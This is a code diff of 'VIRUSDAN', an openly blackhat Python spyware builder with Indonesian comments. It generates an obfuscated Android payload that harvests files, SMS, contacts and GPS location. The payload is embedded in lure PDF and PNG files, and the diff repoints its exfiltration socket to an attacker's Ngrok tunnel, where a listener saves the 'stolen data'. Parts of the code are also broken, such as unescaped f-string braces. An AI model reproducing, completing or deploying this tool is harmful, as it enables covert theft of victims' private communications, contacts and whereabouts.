@@ -7,13 +7,14 @@ import random
 import string
 import time
 import requests
-from flask import Flask, send_file
+from flask import Flask, send_from_directory
 from datetime import datetime
 import zlib
 from rich.console import Console
 from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, TextColumn
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from rich.text import Text
+from rich.live import Live
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
@@ -42,14 +43,13 @@ def verify_wan_code():
     temp_code = "GFXWRS321"  # Kode WAN yang lu tentuin
     console.print("[cyan]Masukkan kode WAN anda:[/cyan]")
     user_code = console.input("[yellow]Kode: [/yellow]")
-
-    # Animasi loading keren
+    
     with Progress(SpinnerColumn(), TextColumn("[cyan]Verifikasi kode anda...[/cyan]"), transient=True) as progress:
         task = progress.add_task("", total=100)
         for _ in range(100):
             time.sleep(0.03)
             progress.update(task, advance=1)
-
+    
     if user_code == temp_code:
         console.print("[green]Kode anda berhasil! Selamat menjalankan skrip ini 😈[/green]\a")
         return True
@@ -84,75 +84,71 @@ def decrypt_data(data):
     cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce=nonce)
     return cipher.decrypt(ciphertext).decode()
 
-# Bikin payload Android
-def create_android_payload():
+# Bikin payload Android (dengan perbaikan untuk connect ke Ngrok)
+def create_android_payload(public_url):
     payload_code = (
-        "import os, socket, base64, shutil, time, android.permissions;"
-        "from android.provider import ContactsContract, Telephony;"
-        "from jnius import autoclass;"
-        "LocationManager = autoclass('android.location.LocationManager');"
-        "Context = autoclass('android.content.Context');"
-        "def steal_data():"
-        "    data = {};"
-        "    try:"
-        "        # Nyedot file"
-        "        for root, dirs, files in os.walk('/storage/emulated/0'):"
-        "            for file in files:"
-        "                path = os.path.join(root, file);"
-        "                if os.path.getsize(path) < 10485760:"  # Max 10MB
-        "                    with open(path, 'rb') as f:"
-        "                        data[path] = base64.b64encode(f.read()).decode();"
-        "        # Nyedot SMS"
-        "        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
-        "            Telephony.Sms.CONTENT_URI, None, None, None, None);"
-        "        while cursor.moveToNext():"
-        "            sms = cursor.getString(cursor.getColumnIndexOrThrow('body'));"
-        "            data['sms_' + str(time.time())] = base64.b64encode(sms.encode()).decode();"
-        "        # Nyedot kontak"
-        "        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
-        "            ContactsContract.Contacts.CONTENT_URI, None, None, None, None);"
-        "        while cursor.moveToNext():"
-        "            contact = cursor.getString(cursor.getColumnIndexOrThrow('display_name'));"
-        "            data['contact_' + str(time.time())] = base64.b64encode(contact.encode()).decode();"
-        "        # Nyedot lokasi"
-        "        lm = autoclass('org.kivy.android.PythonActivity').mActivity.getSystemService(Context.LOCATION_SERVICE);"
-        "        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);"
-        "        if location:"
-        "            data['location'] = base64.b64encode(f'{location.getLatitude()},{location.getLongitude()}'.encode()).decode();"
-        "    except: pass;"
-        "    return data;"
-        "def send_data():"
+        f"import os, socket, base64, shutil, time, android.permissions;"
+        f"from android.provider import ContactsContract, Telephony;"
+        f"from jnius import autoclass;"
+        f"LocationManager = autoclass('android.location.LocationManager');"
+        f"Context = autoclass('android.content.Context');"
+        f"def steal_data():"
+        f"    data = {};"
+        f"    try:"
+        f"        for root, dirs, files in os.walk('/storage/emulated/0'):"
+        f"            for file in files:"
+        f"                path = os.path.join(root, file);"
+        f"                if os.path.getsize(path) < 10485760:"  
+        f"                    with open(path, 'rb') as f:"
+        f"                        data[path] = base64.b64encode(f.read()).decode();"
+        f"        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
+        f"            Telephony.Sms.CONTENT_URI, None, None, None, None);"
+        f"        while cursor.moveToNext():"
+        f"            sms = cursor.getString(cursor.getColumnIndexOrThrow('body'));"
+        f"            data['sms_' + str(time.time())] = base64.b64encode(sms.encode()).decode();"
+        f"        cursor = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver().query("
+        f"            ContactsContract.Contacts.CONTENT_URI, None, None, None, None);"
+        f"        while cursor.moveToNext():"
+        f"            contact = cursor.getString(cursor.getColumnIndexOrThrow('display_name'));"
+        f"            data['contact_' + str(time.time())] = base64.b64encode(contact.encode()).decode();"
+        f"        lm = autoclass('org.kivy.android.PythonActivity').mActivity.getSystemService(Context.LOCATION_SERVICE);"
+        f"        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);"
+        f"        if location:"
+        f"            data['location'] = base64.b64encode(f'{location.getLatitude()},{location.getLongitude()}'.encode()).decode();"
+        f"    except: pass;"
+        f"    return data;"
+        f"def send_data():"
         f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);"
-        f"    s.connect(('127.0.0.1', {SERVER_PORT}));"
-        "    data = steal_data();"
-        "    for path, content in data.items():"
-        "        packet = f'FILE:{path}:{content}'.encode();"
-        "        s.send(packet);"
-        "        time.sleep(0.1);"
-        "    s.send(b'END');"
-        "    s.close();"
-        "send_data();"
+        f"    s.connect(('{public_url.split('//')[1]}', {SERVER_PORT}));"  # Connect ke Ngrok URL
+        f"    data = steal_data();"
+        f"    for path, content in data.items():"
+        f"        packet = f'FILE:{path}:{content}'.encode();"
+        f"        s.send(packet);"
+        f"        time.sleep(0.1);"
+        f"    s.send(b'END');"
+        f"    s.close();"
+        f"send_data();"
     )
     return obfuscate(payload_code)
 
 # Bikin PDF payload
-def generate_pdf_payload():
-    with Progress() as progress:
-        task = progress.add_task("[cyan]Generating PDF payload...", total=100)
+def generate_pdf_payload(public_url):
+    with Progress(SpinnerColumn(), BarColumn(), TextColumn("[cyan]Generating PDF payload...[/cyan]"), transient=True) as progress:  # Lebih heboh
+        task = progress.add_task("", total=100)
         for i in range(100):
             time.sleep(0.02)
             progress.update(task, advance=1)
     
+    payload = create_android_payload(public_url)
     pdf_content = (
         b"%PDF-1.4\n"
         b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
         b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>\nendobj\n"
         b"4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 24 Tf 100 700 Td (Dokumen Rahasia) Tj ET\nendstream\nendobj\n"
+        b"5 0 obj\n<< /Type /EmbeddedFile /Length " + str(len(payload)).encode() + b" >>\nstream\n" + payload.encode() + b"\nendstream\nendobj\n"
+        b"trailer\n<< /Root 1 0 R >>\n%%EOF"
     )
-    payload = create_android_payload()
-    pdf_content += b"5 0 obj\n<< /Type /EmbeddedFile /Length " + str(len(payload)).encode() + b" >>\nstream\n" + payload.encode() + b"\nendstream\nendobj\n"
-    pdf_content += b"trailer\n<< /Root 1 0 R >>\n%%EOF"
     
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     pdf_path = os.path.join(OUTPUT_DIR, f"{PAYLOAD_NAME}_{timestamp}.pdf")
@@ -162,9 +158,9 @@ def generate_pdf_payload():
     return os.path.basename(pdf_path)
 
 # Bikin Gambar payload
-def generate_image_payload():
-    with Progress() as progress:
-        task = progress.add_task("[cyan]Generating Gambar payload...", total=100)
+def generate_image_payload(public_url):
+    with Progress(SpinnerColumn(), BarColumn(), TextColumn("[cyan]Generating Gambar payload...[/cyan]"), transient=True) as progress:
+        task = progress.add_task("", total=100)
         for i in range(100):
             time.sleep(0.02)
             progress.update(task, advance=1)
@@ -176,7 +172,7 @@ def generate_image_payload():
         b"\x00\x00\x00\x01sRGB\x00\xAE\xCE\x1C\xE9"
         b"\x00\x00\x00\x04gAMA\x00\x00\xB1\x8F\x0B\xFC\x61\x05"
     )
-    payload = create_android_payload()
+    payload = create_android_payload(public_url)
     png_content += b"\x00\x00\x00\x0CIDATx\x9c" + base64.b64decode(payload) + b"\x00\x00\x00\x00IEND\xAE\xB0\x60\x82"
     
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -189,11 +185,9 @@ def generate_image_payload():
 # Auto-Ngrok
 def start_ngrok():
     try:
-        # Jalanin Ngrok
         os.system(f"ngrok authtoken {NGROK_AUTH_TOKEN}")
         ngrok_process = os.popen(f"ngrok http {FLASK_PORT}")
         time.sleep(2)
-        # Ambil public URL
         response = requests.get("http://localhost:4040/api/tunnels")
         public_url = response.json()["tunnels"][0]["public_url"]
         console.print(f"[yellow]Ngrok link: {public_url}[/yellow]")
@@ -202,34 +196,36 @@ def start_ngrok():
         console.print("[red]Gagal jalanin Ngrok! Kirim manual via WA.[/red]")
         return None
 
-# Server listener
+# Server listener dengan CLI lebih heboh
 def data_listener():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', SERVER_PORT))
     server_socket.listen(5)
     console.print(f"[magenta]Listener jalan di port {SERVER_PORT}, nunggu target...[/magenta]")
     
-    while True:
-        client_socket, addr = server_socket.accept()
-        console.print(f"[green]Target connect dari: {addr}[/green]")
-        buffer = b""
+    with Live(Progress(SpinnerColumn(), TextColumn("[cyan]Menunggu koneksi target... Siap action! 😈[/cyan]"), refresh_per_second=10), refresh_per_second=4) as live:  # Animasi heboh
+        task = live.update(Progress(SpinnerColumn(), TextColumn("[cyan]Sedang memantau...[/cyan]"))
         while True:
-            data = client_socket.recv(1024)
-            if not data or b"END" in data:
-                break
-            buffer += data
-        if buffer.startswith(b"FILE:"):
-            try:
-                _, file_path, content = buffer.decode().split(":", 2)
-                file_path = file_path.replace("/storage/emulated/0", "")
-                safe_path = os.path.join(STOLEN_DATA_DIR, f"{addr[0]}{file_path}")
-                os.makedirs(os.path.dirname(safe_path), exist_ok=True)
-                with open(safe_path, "wb") as f:
-                    f.write(base64.b64decode(content))
-                console.print(f"[green]Data curian tersimpan di: {safe_path}[/green]")
-            except:
-                pass
-        client_socket.close()
+            client_socket, addr = server_socket.accept()
+            console.print(f"[green]Target connect dari: {addr}[/green]")
+            buffer = b""
+            while True:
+                data = client_socket.recv(1024)
+                if not data or b"END" in data:
+                    break
+                buffer += data
+            if buffer.startswith(b"FILE:"):
+                try:
+                    _, file_path, content = buffer.decode().split(":", 2)
+                    file_path = file_path.replace("/storage/emulated/0", "")
+                    safe_path = os.path.join(STOLEN_DATA_DIR, f"{addr[0]}{file_path}")
+                    os.makedirs(os.path.dirname(safe_path), exist_ok=True)
+                    with open(safe_path, "wb") as f:
+                        f.write(base64.b64decode(content))
+                    console.print(f"[green]Data curian tersimpan di: {safe_path}[/green]")
+                except:
+                    pass
+            client_socket.close()
 
 # Animasi typing
 def type_text(text):
@@ -245,7 +241,6 @@ def main_menu():
     listener_thread.start()
     public_url = start_ngrok()
     
-    # Verifikasi kode WAN sebelum masuk menu
     if not verify_wan_code():
         console.print("[red]Akses ditolak! Keluar dari VIRUSDAN.[/red]\a")
         return
@@ -264,17 +259,22 @@ def main_menu():
         choice = console.input("[cyan]Pilih opsi (1/2/3): [/cyan]")
         
         if choice == "1":
-            filename = generate_pdf_payload()
-            console.print(f"[yellow]Link download: {public_url}/download/{filename if public_url else filename}[/yellow]\a")
+            filename = generate_pdf_payload(public_url)
+            console.print(f"[yellow]Link download: {public_url}/download/{filename}[/yellow]\a")
         elif choice == "2":
-            filename = generate_image_payload()
-            console.print(f"[yellow]Link download: {public_url}/download/{filename if public_url else filename}[/yellow]\a")
+            filename = generate_image_payload(public_url)
+            console.print(f"[yellow]Link download: {public_url}/download/{filename}[/yellow]\a")
         elif choice == "3":
             console.print("[red]Sampai jumpa, sampai ketemu lagi[/red]\a")
             break
         else:
             console.print("[red]Pilihan salah, bro! Coba lagi.[/red]")
         time.sleep(1)
+
+# Tambah route Flask
+@app.route('/download/<filename>')
+def download_file(filename):
+    return send_from_directory(OUTPUT_DIR, filename)
 
 if __name__ == "__main__":
     type_text("Initializing VIRUSDAN... Blackhat Indonesia 😈")
